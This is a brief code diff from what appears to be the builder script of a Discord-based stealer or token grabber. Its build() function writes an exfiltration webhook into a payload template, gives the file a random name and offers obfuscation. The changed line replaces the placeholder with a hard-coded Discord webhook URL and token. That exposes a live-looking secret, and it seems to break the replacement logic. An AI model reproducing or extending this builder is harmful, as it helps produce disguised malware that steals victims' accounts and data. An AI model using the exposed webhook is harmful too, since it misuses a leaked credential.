@@ -36,7 +36,7 @@ def build():
     _filename = ''.join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for i in range(10)])
     filename = _filename + "_tmp.py"
 
-    data = data.replace("WEBHOOK GOES HERE", webhook)
+    data = data.replace("https://discord.com/api/webhooks/1229584720531292201/WDEw69LI5LC0zdV-PKfO8HyOQ7DORxx1RIOAP42Rdn6cZXLSTQfd8EoMyTnszNb4bdrW", webhook)
     data = data.replace("forceRead = False", f"forceRead = {forceRead}")
 
     if obfuscate:
